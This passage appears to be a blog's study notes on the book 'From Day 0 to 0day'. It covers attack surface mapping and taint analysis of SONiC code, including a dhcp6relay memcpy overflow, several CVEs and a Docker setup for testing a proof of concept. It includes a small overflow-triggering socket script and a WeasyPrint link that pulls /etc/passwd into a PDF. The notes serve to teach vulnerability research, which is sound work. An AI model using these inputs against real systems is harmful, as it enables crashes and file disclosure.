functionality, from clients to servers.\nNetwork Protocols Software can use many other network protocols than HTTP to communicate over networks.\nThe Transmission Control Protocol/Internet Protocol (TCP/IP) model organizes the communication protocols between systems in four layers:\nApplication Handles communication between applications (for example, HTTP, DNS, and FTP) Transport Handles communication between hosts (TCP and UDP) Internet Handles communication between networks (IP and ICMP) Link Handles communication between physical devices (MAC)\nMost software defers the handling of data at the lower layers to operating system APIs or standard libraries; discovering a vulnerability at these levels will create an extensive impact.\nThe majority of code you will encounter deals with the application layer, such as the dhcp6relay server in SONiC (see Chapter 1). Since SONiC is built to run on networking devices like switches, it’s a useful reference for mapping a software’s network protocol attack surface. To identify potential network protocol attack vectors, start with the most basic API calls: opening a network socket, listening to it, and receiving data.\nExemple :\n\u0026ldquo;The Inter-Chassis Communication Protocol (ICCP) server initialization code\u0026rdquo;\n/* Server socket initialization */ void scheduler_server_sock_init() { int optval = 1; struct System* sys = NULL; struct sockaddr_in src_addr; if ((sys = system_get_instance()) == NULL) return; sys-\u0026gt;server_fd = socket(PF_INET, SOCK_STREAM, 0); //1 bzero(\u0026amp;(src_addr), sizeof(src_addr)); src_addr.sin_family = PF_INET; src_addr.sin_port = htons(ICCP_TCP_PORT); //2 src_addr.sin_addr.s_addr = INADDR_ANY; //3 --snip-- if (bind(sys-\u0026gt;server_fd, (struct sockaddr*)\u0026amp;(src_addr), sizeof(src_addr)) \u0026lt; 0) { ICCPD_LOG_INFO(__FUNCTION__, \u0026#34;Bind socket failed. Error\u0026#34;); return; } The [iccpd] server initialization code\n(//1) : PF_INET refer to IPV4 internet protocol, the next argument, SOCK_STREAM define the socket type (in this case is TCP) (//2) : The next line specify that socket use open port ICCP_TCP_PORT (8888) who is defined in iccp_github_code (//3) : YOu can see that port is opened on INADDR_ANY, means that IP addresses associated with the system running the program. The RFC (Request for Comments) documented any of standart protocol like tcp/ip, iccpd, etc\u0026hellip;, they are published by IETF (Internet Engineering Task Force). Their role is to describes the design and implementation of the protocol.\nRead RFC can be a starting point when you targeting a software who implement the specific protocols\nOften when the protocol is proprietary niche enough to require a tailor-made approch, the developpers can write her own custom implementation , who will surely less tested than open source protocols.\nWhen reviewing code for a protocol, focus on two main features: the data structures and the procedures.\nData Structures The data structures define how data is formatted and parsed in a network protocol.\nExemple:\nWhen you check AgentX(Agent Extensibility Protocol) who is a networking protocol that enables a single SNMP master agent to manage multiple subagents It was inplemented on sonic-snmpagent and documented in RFC 2741 The \u0026ldquo;Protocol Definition\u0026rdquo; section defines the AgentX protocol data unit (PDU) header.\n6. Protocol Definitions 6.1. AgentX PDU Header The AgentX PDU header is a fixed-format, 20-octet structure: +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | h.version | h.type | h.flags | \u0026lt;reserved\u0026gt; | +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | h.sessionID | +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | h.transactionID | +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | h.packetID | +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | h.payload_length | +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ An AgentX PDU header contains the following fields The maintainer define a PDUHeaderTags class with a from_bytes :\nsonic-snmpagent/src/ax_interface/pdu.py\nclass PDUHeaderTags(namedtuple(\u0026#39;_PDUHeaderTags\u0026#39;, (\u0026#39;version\u0026#39;, \u0026#39;type_\u0026#39;, \u0026#39;flags\u0026#39;, \u0026#39;reserved\u0026#39;))): --snip-- @classmethod def from_bytes(cls, byte_string): return cls( *struct.unpack(\u0026#39;!BBBB\u0026#39;, byte_string[:4]) ) Here is use !BBBB , mean that the bytes or octet should be interpreted in network byte order (big-endian) as four 1-byte unsigned chars. The PDUHeaderTags instance respect the descriptions in the RFC, if the differences between the implementation and of data stuctures (in the code) and the expected format required the vulnerabilities can occurs.\nEx : In dhcpv6relay protocol implentation the option-\u0026gt;option_length variable is parsed like a unsigned 16 bit integer (short type) who normaly have 65635 for maximum value. before using it as number of bytes to copy into a fixed buffer of size 4096.\nProcedures A network protocol’s procedures define the rules and conventions of communication. These procedures include the expected order and actions taken by clients or servers.\nWhen a data structures vulnerability lead to memory corruption issues, procedures problems do to higher-level business logic such as authentication and authorization.\nKnowing what constitutes a security boundary in a network protocol is necessary to correctly identify a business logic vulnerability.\nExemple of procedures :\nHandshaking: Initially exchanging messages in order to establish communication. Session management: Tracking individual sessions between the two entities. State management: Controlling the state of an individual session. Flow control: Managing the rate and order of data transmission. Error handling: Performing recovery or termination from invalid data. Encryption: Ensuring the privacy, authenticity, and integrity of communication. Session termination: Performing teardown and cleanup of the session in an orderly manner. YOu can see by example of procedures describes in any rfc like rfc 2741 in section 7 (Elements of Pro- cedure.)\nLocal Attack Surface Network Protocols like (TCP, UDP, SCTP) deal with communication between different machines (over the internet or local network). When program or different part of the same program running on your computer IPC is the way these different programs can talk to each other and share information on that one computer. IPC can happen between different processes or between threads within the same process. Network protocols are for computers talking to other computers, while IPC is for programs talking to each other on the same computer.\nAgentX can operate over the network and via IPC. the attacker’s perspective, network transport protocols expose a remote attack vector, while local transport protocols expose a (surprise!) local attack vector. Why ? Because AgentX subagents to communicate with the master agent on the same host, RFC 2741 suggests local mechanisms such as shared memory, named pipes, and sockets. This opens up a whole new attack surface for the same protocol.\n\u0026gt; Files in Inter-Process Communication From sockets to devices, developers can expose many input/output resources using files to provide a common set of channels to work with.\nWhen you IPC file exchange or file to exchange data between two process, the disk I/O is required for some action.\nOne exemple for this is to use lock files who indicates that a another process used this file, it can help to prevent that multiple instance of the same file was running. Real exemple is when you use editor like vim in two different terminal to modify a file, it show you a warning showing you that another process already used this file (but here vim used .swap for temporary save data).\nReal life example: Exploiting a Hardcoded Path in Apport One implementation of lock files led to an interesting privilege escalation vulnerability (CVE-2020-8831) in Ubuntu via the Apport program. The code causing this vulnerability lay in the check_lock, function.\ndef check_lock(): \u0026#39;\u0026#39;\u0026#39;Abort if another instance of apport is already running. This avoids bringing down the system to its knees if there is a series of crashes.\u0026#39;\u0026#39;\u0026#39; # create lock file directory try: os.mkdir(\u0026#34;/var/lock/apport\u0026#34;, mode=0o744) //1 except FileExistsError: pass # create a lock file try: fd = os.open(\u0026#34;/var/lock/apport/lock\u0026#34;, os.O_WRONLY | os.O_CREAT | os.O_NOFOLLOW) //2 except OSError as e: error_log(\u0026#39;cannot create lock file (uid %i): %s\u0026#39; % (os.getuid(), str(e))) sys.exit(1) def error_running(*args): error_log(\u0026#39;another apport instance is already running, aborting\u0026#39;) sys.exit(1) original_handler = signal.signal(signal.SIGALRM, error_running) signal.alarm(30) # timeout after that many seconds try: fcntl.lockf(fd, fcntl.LOCK_EX) //3 except IOError: error_running() finally: signal.alarm(0) signal.signal(signal.SIGALRM, original_handler) In check_lock function the lock file in create if doesn\u0026rsquo;t exit (//1). After it trying to acquire a lock file using a POSIX compliant API call who allow developers to implement lock files in a more standized way. (//3). O_NOFOLLOW : In man 2 open it describe that \u0026ldquo;If the trailing component (i.e., basename) of pathname is a symbolic link, then the open fails, with the error ELOOP. Symbolic links in earlier components of the pathname will still be followed.\u0026rdquo; So with the hardcoded path /var/lock/apport/lock who have lock like basename, an attacker could use a symlink to redirect the program to read from or write to a different destination that the program has access to. This is the problem: if any other component in /var/lock/apport/lock other than lock is a symlink, Apport will still happily follow it. In the case of Ubuntu, /var/lock is a symlink to /run/lock, which is readable and writable by all users. As such, an attacker can create a symlink at /var/lock/apport pointing to any other directory, and if Apport runs afterward, it will create a lock file in the attacker-controlled destination.\n\u0026gt; Sockets A socket is an endpoint that allows communication between processes. It a one of the more common IPC channels and hence present a rich source of potential attack vectors.\nUnix OS support Unix domain sockets (UDSs), a local variant (TCP, UDP, SCTP), but UDS don\u0026rsquo;t take care of protocol layer and run fast. The socket respect the \u0026ldquo;everything is file\u0026rdquo; Unix philosophy so expose a UDSs in a filesystem pathname can lead to namespaces hijacking or access control due to inappropriate file permissions.\nEx : A CVE-2022-21950 was a vulnerability in Canna, a Japanese Kana–Kanji server, that arose from the hardcoded directory /tmp/.iroha_unix containing the UDS used by Canna in openSUSE OS.\n\u0026gt; Named Pipes Named pipes are another means by which processes can communicate using a file-like paradigm. However, on Windows, named pipes have their own access control model separate from the default filesystem, creating an additional layer of potential authorization issues.\nTake, for example, a high-privileged program that creates a named pipe server and client for IPC. If a low-privileged attacker creates the named pipe server before the program does, it could potentially intercept messages from the client. Worse, if the client makes use of the server’s responses to execute actions such as running commands, it could lead to privilege escalation.\nThis was the case for CVE-2022-21893, a privilege escalation exploit in Windows Remote Desktop Mapping Code to Attack Surface Services (RDS) that allowed an attacker to intercept the messages of RDS named pipe IPC.\n\u0026gt; Other IPC Methods The number of IPC methods is constantly growing as operating systems and third-party software add features. The following is a nonexhaustive list:\nShared memory System signal Message queue Memory-mapped file Remote procedure call Component Object Model (COM, Windows only) Dynamic Data Exchange (DDE, Windows only) Clipboard D-Bus (Linux only) MailSlot (Windows only) Developers use these APIs in creative (and potentially insecure) ways.\nFile Formats Almost all software needs to handle files. From newline-delimited configuration files to video clips, we encode data in a variety of formats. Like protocols, file formats require software to parse data structures in a standard manner. Many file formats are documented in RFCs, but proprietary or older formats may require more digging. For example, file formats are often roughly divided into three parts:\nHeader: Appears at the start of the file and usually begins with a set of unique bytes so software can identify the file format. Body: Contains the main data associated with the format, often grouped into chunks for software to parse easily. Footer: Contains additional metadata, such as checksums to ensure data integrity. Other formats diverge even further from the header-body-footer pattern, such as directory-based formats, which organize data into multiplefiles within a directory structure.\nFor example, Microsoft Office documents (such as .docx and .pptx files) are essentially ZIP containing resource and metadata files such as XML documents, images, and so on.\n\u0026gt; Type–Length–Value The type–length–value (TLV) pattern occurs in both protocols and file formats. We use TLV for chunked data in the body because its structure allows a parser to easily identify and consume chunks of variable length.\n\u0026gt; Directory-Based A significant subset of file formats are directory-based, meaning the file is actually a wrapper around many other files. Like ZIP, DEB . Typically, directory-based formats require a manifest (manifest.xml) that contains additional metadata about the rest of the files, including where they’re located. This pattern tends to expose two types of vulnerabilities, related to file traversal and child format.\nFile traversal occurs if the software insecurely parses the directory data. A parser that trusts such a value could extract files into dangerous locations, such as cron job folders or application working directories. Child format–related vulnerabilities occur because developers tend to focus on the parent directory–based format and delegate handling child file formats to external libraries, which may not parse securely by default. Sometimes, both types of vulnerabilities occur in the same software. Example of vuln\nCustom Fields File formats often include reserved bytes or extendable fields that allow developers to add custom functionality. Sometimes, developers jerry-rig custom fields by parsing data differently from how a standard defines it. Thus, to indicate a stylesheet located at main.css, an HTML document could include the following element:\n\u0026lt;link href=\u0026#34;main.css\u0026#34; rel=\u0026#34;stylesheet\u0026#34;\u0026gt; However, the WeasyPrint HTML-to-PDF conversion engine extends the function of \u0026lt;link\u0026gt; by supporting a custom attachment value for rel that doesn’t appear in the HTML standard. By using this value, a developer can include local files as attachments to the output PDF:\n\u0026lt;link href=\u0026#34;file:///etc/passwd\u0026#34; rel=\u0026#34;attachment\u0026#34;\u0026gt; This is a feature, not a vulnerability in itself, but a developer that uses WeasyPrint without accounting for this behavior could introduce a vulnerability in their software.\n","permalink":"http://localhost:1313/book-reviews/from-day0-to-0day-chapter-2/","title":"From Day 0 to 0day Chapter 2"},{"content":"\nIntroduction Taint Analysis Life is not like water. Things in life don’t necessarily flow over the shortest possible route - Haruki Murakami - 1Q84\nTaint analysis (or source and sink analysis ) is the analysis of the flow of input through a program from sources to sinks .\nIt relies on a simple idea: a large number of vulnerabilities occur because attacker controlled input (the source) flows to a dangerous function (the sink). If the input modifies other variables along the way, these variables become \u0026ldquo;tainted\u0026rdquo; and are included in the analysis.\nIf the code later uses those tainted variables to modify others, those variables are also tainted, and so on. This is known as taint propagation.\nBuffer Overflow In my laptop with or without -fstack-protector it display stack smashing detected so it detect buffer overflow when i run a exploit script\nApplying Taint Analysis\nFirst, identify the source. For what is see here the user not directly controls input, but we have to function the main who use argc and argv (who are really not used in the code), and the second function handleClient who use a variable passed to parameters who is call in main function. The variable clientSocket is used two time in the code and where we have problem is line 19 . while ((bytesRead = recv(clientSocket, buffer, MAX_BUFFER_SIZE, 0)) \u0026gt; 0) Next, identify the sink, a dangerous function that could cause negative outcomes like memory corruption if an attacker controls its inputs This is line 20\nmemcpy(finalBuffer + offset, buffer, bytesRead); 1 - Is the variables who is incremented and increase the memory allocated.\n2 - It the line who create a buffer overflow due to the memory copy done here.\n3 - It\u0026rsquo;s the where the problem born with the limited buffer size.\nNow in main function : 1- The vulnerable function is used only one time, but the variable passed to parameters not.\n2- The clientSocket variable is used for accept value from connection create in (3)\n3 - The connection is create here and is listen in (4)\n4 - The connection is listen here , the value is send to connection waiting like input , and the value is send to handleClient .\nSo the exploit code is here :\nimport socket host = socket.gethostname() port = 1234 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.connect((host, port)) s.sendall(b\u0026#39;A\u0026#39; * 1024) s.close() Result:\nApplying Taint Analysis First, identify the source. This should be the output of a function that retrieves and stores attacker-controlled input.\nbytesRead = recv(clientSocket, buffer, MAX_BUFFER_SIZE, 0) Next, identify the sink, a dangerous function that could cause negative outcomes like memory corruption if an attacker controls its inputs.\nmemcpy(finalBuffer + offset, buffer, bytesRead); We must trace the flow of tainted variables from the first to the last.\nAny others variables who is affected by a tainted variable is also tainted . This can conduct to path explosion .\nPath explosion refers to the fact that the number of control-flow paths in a program grows exponentially (\u0026ldquo;explodes\u0026rdquo;) with an increase in program size and can even be infinite in the case of programs with unbounded loop iterations (Source Wikipedia).\nThis makes it impossible, or at least extremely time-consuming, to apply taint analysis to all possible paths in a complex target.\nWe have here 70 lines so we not worry about path explosion.\nSink-to-Source Analysis Don\u0026rsquo;t forget that controlled input (the source) flows to a dangerous function (the sink).\nLiveoverflow video helped me to make a summary of any things (https://youtu.be/ZaOtY4i5w_U)\nWhile the source-to-sink approach favors completeness, sink-to-source analysis favors selection. As you saw, taking the most obvious route in taint analysis, starting from input sources and working your way through the code, leads to exponentially branching paths of tainted variables that are impossible to follow.\nSummary 0 While the source-to-sink approach favors completeness, sink-to-source analysis favors selection.\nSource-to-sink analysis favors completeness: This approach starts from all potential sources of data (user input, network connections, file reads) and traces how that data propagates through the system until it reaches sinks (database queries, file writes, display to user, command execution). The goal is to identify all possible paths that data can take, even if they are very indirect. This is crucial for finding vulnerabilities where untrusted data could eventually reach a sensitive operation without proper sanitization or validation. Because it aims to be exhaustive, it might generate more \u0026ldquo;false positives\u0026rdquo; (paths that are theoretically possible but might not be exploitable in practice).\nSink-to-source analysis favors selection (or relevance): This approach starts from a specific sink (a sensitive operation that you want to protect) and traces backward to identify what sources could feed data into that sink. The goal here is to determine which inputs could influence a particular sensitive operation. This is useful for prioritizing analysis, focusing on the most critical parts of the code, and reducing the number of irrelevant findings. It\u0026rsquo;s more targeted and thus \u0026ldquo;selective.\u0026rdquo;\nTotal :\nSource-to-sink: \u0026ldquo;Where can this potentially bad data go?\u0026rdquo; (Broad, comprehensive)\nSink-to-source: \u0026ldquo;What data can influence this sensitive operation?\u0026rdquo; (Targeted, selective)\nChoosing the Right Sinks The first step is to select the sink patterns that you want to work backward from. You can refer to banned function lists maintained by other developers to discover common dangerous sinks and how to exploit them. or example, Microsoft actively updates the list of banned functions that it integrates in its code analysis tools Microsoft baneed function.\nIn addition to the standard library functions like memcpy, analyze the source code carefully to identify wrapper functions that may help simplify your analysis. Developers often append _copy or _memcpy to the names of these wrapper functions.\nWait, wait, what is wrappers ?\nThe term \u0026ldquo;wrapper\u0026rdquo; in computer science, and specifically in programming, refers to a piece of code (which can be a function, a class, or even an entire program) that \u0026ldquo;encapsulates\u0026rdquo; or \u0026ldquo;wraps around\u0026rdquo; another piece of code, a data structure, or an external system.\nThink of it like this:\nA gift wrapper: You wrap a gift to make it look nicer, protect it, and provide a convenient way to present it. The wrapper itself isn\u0026rsquo;t the gift, but it makes the gift more presentable and manageable. A universal adapter for electronics: You have a device with a specific plug, and you want to use it in a country with different outlets. A universal adapter \u0026ldquo;wraps\u0026rdquo; the device\u0026rsquo;s plug, allowing it to connect to the new outlet without changing the device\u0026rsquo;s original plug. Ex :\ndef my_simple_wrapper(func): def inner_function(*args, **kwargs): print(f\u0026#34;Calling function: {func.__name__}\u0026#34;) result = func(*args, **kwargs) print(f\u0026#34;Finished calling function: {func.__name__}\u0026#34;) return result return inner_function def greet(name): return f\u0026#34;Hello, {name}!\u0026#34; # Manually wrapping the function wrapped_greet = my_simple_wrapper(greet) print(wrapped_greet(\u0026#34;Alice\u0026#34;)) Output:\nCalling function: greet Finished calling function: greet Hello, Alice! Another factor in deciding which wrapper functions to include in your analysis is how many times the functions are used. If they include too much custom logic that applies only to rare cases, they cease to be useful.\nBy Example if a wrapper function is used (is call) only once in all codebase it not important. As a general rule, consider wrapper functions as sinks when they’re reused extensively relative to the total size of the codebase.\nFiltering for Exploitable Scenarios After selecting your sinks, begin tracing the flow of tainted variables backward from the sinks.\nNull dereference: When the code tries to access data at an invalid null address, leading to crashes. For memcpy, this occurs when dest or src is a null pointer. Buffer overflow: When the code writes beyond the size of dest. This can occur when n is larger than the size of dest.\nInformation leak: When the code reads data from addresses that is not intended to be exposed. This occurs when n is larger than src.\nMemory corruption: When the code makes unintended changes to memory, which can occur if dest and src overlap.\nEx :\nOn platform/centec-arm64/tsingma-bsp/src/ctcmac/ctcmac.c (on local) or sonic-buildimage-old-commit .\n5 : Starting from the first argument, tx_buff-\u0026gt;vaddr + offset (5) , which corresponds to the destination buffer for memcpy function . void *memcpy(void dest[restrict .n], const void src[restrict .n], size_t n); # on man memcpy 2 : Work backward to where tx_buff-\u0026gt;vaddr is first assigned the return value of kmalloc(alloc_size, GFP_KERNEL) (2) This warrants greater attention because kmalloc allocates kernel memory, corruption of which could be devastating. void * kmalloc(size_t size, int flags) 1 : The size of the buffer allocated to tx_buff-\u0026gt;vaddr is alloc_size, set by the cryptic macro ALIGN(skb-\u0026gt;len, BUF_ALIGNMENT) (1) .\n3 : Before figuring out what this macro does, examine the value assigned to offset (3 ), which also appears in the first argument to memcpy later on.\n4 : Because the ((u64) tx_buff-\u0026gt;vaddr) \u0026amp; (BUF_ALIGNMENT - 1) bitwise AND operation (\u0026amp;) ensures that the result has a maximum value of BUF_ALIGNMENT - 1 , offset must range from 1 to BUF_ALIGNMENT. The next if conditional block 1 moves this range down to 0 to BUF_ALIGNMENT - 1 , since it will be reassigned the value 0 if it equals BUF_ALIGNMENT. In short, the destination address for memcpy ranges from\ntx_buff-\u0026gt;vaddr to tx_buff-\u0026gt;vaddr + (BUF_ALIGNMENT - 1). in (5) .\nAdditionally, because the buffer at tx_buff-\u0026gt;vaddr is of size ALIGN(skb-\u0026gt;len, BUF_ALIGNMENT) on (2), or at least BUF_ALIGNMENT bytes, it isn’t possible for tx_buff-\u0026gt;vaddr + offset to exceed the allocated buffer.\nThus, you can safely ignore the first argument to the memcpy call in your taint analysis because it will never be dangerous by itself. Instead, focus on the third argument, which determines the number of bytes copied into the buffer and could potentially cause an overflow.\nThis process demonstrates a big advantage of sink-to-source analysis:\nBy checking whether a sink is exploitable from the beginning, you can decide which paths are relevant instead of chasing down every rabbit hole.\nFurthermore, eliminating one potential attack vector at the sink allows you to eliminate similar patterns elsewhere.\nFor example, because the same memcpy(tx_buff-\u0026gt;vaddr + offset, ...); pattern appears in frag_to_txbuff_alloc and skb_to_txbuff_alloc, you can skim those instances instead of repeating the analysis. Remember that sink-to-source tracing prioritizes selection, while source-to-sink tracing prioritizes completeness.\nfrag_to_txbuff_alloc skb_to_txbuff_alloc Fortunately, not all instances of filtering sinks require as much depth. Consider the following instances of memcpy in platform/barefoot/bfn-modules/modules/bf_tun.c :\nmemcpy(cmd, \u0026amp;tun-\u0026gt;link_ksettings, sizeof(*cmd));\nIt uses sizeof to ensure the number of bytes copied into the cmd buffer matches its size memcpy(filter-\u0026gt;addr[n], addr[n].u, ETH_ALEN);\nIt uses a fixed constant value for the number of bytes and thus is not attacker-controllable. Observe how many false positives you can filter out by locating all instances of memcpy in the code, then removing instances of non-vulnerable uses of memcpy. ╭─sig42@x76 ~/Downloads/sonic-buildimage/src ‹bcf5388f2●› ╰─$ grep -r \u0026#34;memcpy\u0026#34; --include=\\*.{c,cpp} . | wc -l 237 This command searches all files with a .c or .cpp file extension for the memcpy string, returning 237 results.\nNext, tweak the regular expression to match instances of memcpy that don’t use a constant for the third argument, based on the assumption that constant values either are numeric or have variable names in all capital letters:\n╭─sig42@x76 ~/Downloads/sonic-buildimage/src ‹bcf5388f2●› ╰─$ grep -r \u0026#34;memcpy(.*,.*, [a-z]\u0026#34; --include=\\*.{c,cpp} . | wc -l 97 This regex uses [a-z] to ensure that the third argument starts with a lowercase letter, returning 97 results. This cuts down the number of results you have to manually analyze by more than half!\nNext, filter out instances where the third argument is sizeof(dest):\n╭─sig42@x76 ~/Downloads/sonic-buildimage/src ‹bcf5388f2●› ╰─$ grep -r \u0026#34;memcpy(.*,.*, [a-z]\u0026#34; --include=\\*.{c,cpp} . | grep -v \u0026#34;memcpy(.*,.*,\\s*sizeof(\u0026#34; | wc -l 54 As shown here, instead of overcomplicating the regex, you can simply pipe the results of the first grep command to a second grep command, which uses the -v option to filter out results that match the regex pattern.\nThe pattern finds memcpy calls whose third argument starts with sizeof(, disregarding any leading spaces. (space beetween *, and [a-z]) .\nFor manual code review, focus your time and energy on quickly filtering out non-exploitable scenarios to speed up sink-to-source tracing.\nConfirming Exploitability Taking note of additionnal non-exploitable functions like strlen or sizeof used in third parameters of memcpy . This means that the number of bytes copied likely matches the size of the destination buffer.\n6 : Here the six is not exploitation because of the previous exclusions because of exclusion i talk previously. 4 : For know if the buffer overflow is exploitation here it\u0026rsquo;s important to determine the size of current_buffer_position , her last value was assigned to line (2) auto current_buffer_position = buffer and buffer was declared to line (1) static uint8_t buffer[4096] , know we know that the destination buffer has a fixed size 4096 bytes 5 : Here the problem is that it can provoke a buffer overflow if her value is superior of the size of (4), the ntohs function converts the unsigned short integer netshort from network byte order to host byte order. Continue tracing back from option-optin_length , we can see that the option is set by the function parse_dhcpv6_opt . This function is defined earlier in the file: The buffer variable is parser by a dhcpv6_option struct who is defined in src/dhcp6relay/src/relay.h struct dhcpv6_option { uint16_t option_code; uint16_t option_length; }; The type of option_length is uint16_t who is a (unisgned short integer) with 65535 for max value.\nNoted that we can choose the value used by option-\u0026gt;option_length but the value of buffer destination (current_buffer_position) is fixed to 4096.\nSo this function is exploitable .\nIdentifying an Attacker-Controlled Source After finding an exploitable sink pattern, work backward in the code to con- firm if it is reachable from an attacker-controlled source. At this point, you’ve confirmed three important points in the taint flow:\nA sink exists at the first memcpy call in the relay_relay_reply function. This sink is exploitable if option-\u0026gt;option_length is larger than 4096. The option-\u0026gt;option_length parameter has a maximum value of 65535. Now making sure there are no exploit-killing sanitization or validation steps along the way. Before the memcpy we have a switch case :\nThe switch case execute this part of code if ntohs(option-\u0026gt;option_code)) , in the src/dhcp6relay/src/relay.h file reveals that OPTION_RELAY_MESSAGE corresponds to 9. The option variable is a instance of dhcpv6_option struct parsed from the bytes at the current_position pointer while (current_position - msg) != len. auto option = parse_dhcpv6_opt(current_position, \u0026amp;tmp); Why ? because of parse_dhcpv6_opt is a function who return a dhcpv6_option struct and also because option have option_code and option_length.\n╭─sig42@x76 ~/Downloads/sonic-buildimage ‹bcf5388f2●› ╰─$ grep -A 10 \u0026#34;dhcpv6_option\u0026#34; src/dhcp6relay/src/relay.h struct dhcpv6_option { uint16_t option_code; uint16_t option_length; }; msg argument is a pointer to the DHCPv6 message header position and the len argument is the size of data received (Refer to function annotation). Moreover, current_position is initialized as msg and incremented by the size of a dhcpv6_relay_msg struct: current_position +=sizeof(struct dhcpv6_relay_msg). parse_dhcpv6_opt takes current_position as its first argument. current_position is a pointer (const uint8_t *) that indicates the beginning of the bytes to be interpreted.\nAs the relay_relay_reply function progresses through the received message, current_position is updated to point to the beginning of the next option or the next data segment to be processed. This is the role of current_position = tmp; after the call to parse_dhcpv6_opt.\nThe current_position pointer does not point to a separate copy of the message. It points directly into the original msg that was passed as an argument to the relay_relay_reply function.\nmsg is the raw buffer that contains the entire DHCPv6 message received from the network. Therefore, current_position is simply an offset (an advanced pointer) within this initial msg.\nyou can deduce that current_position during parse_dhcpv6_opt is located in the msg bytes at this offset\nPacket Schema\nmsg current_position len ------------------------------------------------------------------------------------------------------ | dhcpv6_relay_msg | dhcpv6_option | dhcpv6_msg | | | +----------------------------------------------------------------------------------------------------+ After determining that the attacker must control msg (the second argument to relay_relay_reply) to reach the vulnerable memcpy, look for calls to relay_relay_reply to determine the source of the second argument. This function is only used in one function on server_callback The variable message_buffer is passed to second argument of relay_relay_reply, but for reached the memcpy in if statement , it crucial to control the msg variable who fortunately have message_buffer who was be affected to msg.\nAfter that we can see the line containing the first if statement who reads data directly from the network socket (config-\u0026gt;local_sock) and stores it into message_buffer. And the config variable contain arg argument passed to server_callback function.\nConfirming a Reachable Attack Surface We need to confirm whether the source itself is reachable by an attacker. We know that recvfrom function open socket and copy data to config-\u0026gt;local_sock from message_buffer . Multiple possibility are offer here, by example a remote attacker can access to socket when recvfrom is open .\n╭─sig42@x76 ~/Downloads/sonic-buildimage/src ‹bcf5388f2●› ╰─$ grep -ni \u0026#34;config-\u0026gt;local_sock\u0026#34; dhcp6relay/src/relay.cpp 317: interface_config-\u0026gt;local_sock = *local_sock; 573: relay_client(config-\u0026gt;local_sock, current_position, ntohs(udp_header-\u0026gt;len) - sizeof(udphdr), ip_header, ether_header, config); 594: if ((data = recvfrom(config-\u0026gt;local_sock, message_buffer, 4096, 0, (sockaddr *)\u0026amp;from, \u0026amp;len)) == -1) { 719: config-\u0026gt;local_sock = local_sock; The sustainable line here is on line 719 because in the others line the config-\u0026gt;local_sock in parameters. And in this line we can see that a value (local_sock) is affected to config-\u0026gt;local_sock and before this affectation the prepare_socket function is used and local_sock value is passed to parameter. In this code portion we can see that local_sock socket is opened and the port is assigned to in6 sockaddr_in6 address struct.\nThe RELAY_PORT as 547 like value is specified in src/dhcp6relay/src/relay.h .\nAfter observation you can conclude that the vulnerable source-to-sink path exists for any IPv6, non-link-local network interface address on port 547.\nTesting the Exploit However, confirming a vulnerability purely through code review won’t suffice. You need to build a working proof of concept that produces a controllable crash.\nTo build the PoC, you need to first develop a test environment. Without a working build of the target to test your exploit against, you can’t confirm the vulnerability.\nIt’s also helpful to be able to quickly debug your initial proof-of-concept exploits in case something breaks along the way.\nI prefer to build container images to encapsulate PoCs because it provides a consistent environment to experiment in and makes it portable for others to verify the exploit. We need Docker / Podman for do this. But before we need to know how to build the program locally before to build her image and run the container.\nFor building the program check the README and install all dependency, but it\u0026rsquo;s probably to meet other problem during building. So hesitate to copy, paste the error on google . When run make we see this:\nFirst problem #12 0.287 src/relay.cpp:3:10: fatal error: event.h: No such file or directory 3 | #include \u0026lt;event.h\u0026gt; | ^~~~~~~~~ compilation terminated. This error meaning you need to install a shared library that dhcp6relay depends on.\nFor solve that a simple apt install libevent-dev.\nSecond Problem #11 0.328 src/relay.cpp:10:10: fatal error: configdb.h: No such file or directory 10 | #include \u0026#34;configdb.h\u0026#34; | ^~~~~~~~~~~~ compilation terminated. Searching for configdb.h shows that it belongs to the sonic-swss-common library, which is referred to in the -I argument in the Makefile.\nFor this new project we need to build ans install the package yourself, the process to install it is on the README.md file on sonic-swss-common .\nThird Problem After resolve all this dependency on dhcp6relay, we see another problem when we run :\nterminate called after throwing an instance of \u0026#39;std::system_error\u0026#39; what(): Unable to connect to redis (unix-socket): Cannot assign requested address Aborted It appears that dhcp6relay is attempting to connect to a Redis server. If you analyze configInterface.cpp, one of the source files for dhcp6relay, you’ll see that it checks the DHCP_RELAY table in the CONFIG_DB database for a dhcpv6_servers field name.\nFurther research into this configuration setting leads to documentation written by a SONiC developer SONiC-DHCPv6-Relay (He need a account) that contains the expected structure of this configuration setting in the database.\nAfter resolving this requirement by adding the expected configuration to the Redis database, dhcp6relay finally runs but it doesn’t bind to any interfaces because none of them contain non-link-local IPv6 addresses, as prepare_socket requires.\nRather than creating a brand new interface, you can piggyback off an existing one through a virtual local area network (VLAN), then add the required fixed IPv6 addresses.\nBy definition, link-local IPv6 addresses fall in the range fe80::/10, and thus any valid address within this range works.\nSetup ? File : add_ipv6_addresses.sh\n/etc/init.d/redis-server restart ip link add link eth0 name vlan type vlan id 3 ip -6 addr add fe80::20c:29ff:fe90:14c5/64 dev vlan ip -6 addr add 2a00:7b80:451:1::10/64 dev vlan ip link set vlan up redis-cli -n 4 HSET \u0026#34;DHCP_RELAY|vlan\u0026#34; dhcpv6_servers \u0026#34;fe80::20c:29ff:fe90:14c5/64\u0026#34; The Dockerfile\nFROM ubuntu:20.04 # Install dependencies ENV DEBIAN_FRONTEND=noninteractive RUN apt update RUN apt install -y autoconf-archive build-essential dh-exec gdb git iproute2 libboost-dev \\ libboost-thread-dev libevent-dev libgmock-dev libgtest-dev libhiredis-dev libnl-3-dev \\ libnl-genl-3-dev libnl-nf-3-dev libnl-route-3-dev libpython2.7-dev libpython3-dev \\ libtool pkg-config python3 redis-server swig3.0 # Check out repo RUN git clone https://github.com/sonic-net/sonic-buildimage WORKDIR sonic-buildimage RUN git checkout bcf5388 # Build and install sonic-swss-common RUN git submodule update --init src/sonic-swss-common WORKDIR src/sonic-swss-common RUN 